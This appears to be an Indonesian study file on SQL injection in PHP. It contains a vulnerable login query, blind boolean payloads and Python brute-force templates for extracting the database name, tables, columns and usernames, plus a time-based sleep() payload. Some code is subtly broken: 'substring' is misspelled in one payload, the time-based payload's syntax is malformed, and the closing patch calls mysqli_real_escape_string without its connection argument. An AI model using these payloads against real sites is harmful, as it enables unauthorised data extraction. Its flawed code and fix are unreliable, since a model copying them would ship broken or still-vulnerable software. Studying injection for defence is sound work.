<?php

VULN
$username = $_POST["username"];
$password = $_POST["password"];
$login = mysqli_query($conn,"SELECT * FROM user WHERE username = '$username' AND password = '$password'");
if(mysqli_num_rows($login) == 0){
	die("Username atau Password salah");
}else{
	$_SESSION["admin"] = true;
	header("Location:index.php");
}

EXPLOIT
1. Untuk mengecek nama database
	Username = xyz' OR BINARY subsring(database(), 1, 1) = 'hurufyangdicari' --
	dengan menggunakan brute force


2. Brute Force Python
-- Database
username = "xyz' OR BINARY substring(database(), %d, 1) = '%s' -- " % (i, chr(c))
-- Tabel
username = "xyz' OR BINARY substring((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'databasenya'), %d, 1) = '%s' -- " % (i, chr(c))
-- Kolom
username = "xyz' OR BINARY substring((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = 'databasenya' AND table_name = 'nama_tablenya'), %d, 1) = '%s' -- " % (i, chr(c))
-- isi
username = "xyz' OR BINARY substring((SELECT group_concat(username) FROM nama_database.nama_tablenya), %d, 1) = '%s' -- " % (i, chr(c))


Blind Time-Based

VULN
$username = $_POST["username"];
$password = $_POST["password"];
$login = mysqli_query($conn,"SELECT * FROM user WHERE username = '$username' AND password = '$password'");

die("sistem login sedang disable");

EXPLOIT
	Username = xyz' IF(BINARY substring(database(), 1, 1) = 'hurufyangdicari', sleep(3), 0) --

PATCH

1. mysqli_real_escape_string();
$username = mysqli_real_escape_string($_POST["username"]);
$password = mysqli_real_escape_string($_POST["password"]);
$login = mysqli_query($conn,"SELECT * FROM user WHERE username = '$username' AND password = '$password'");
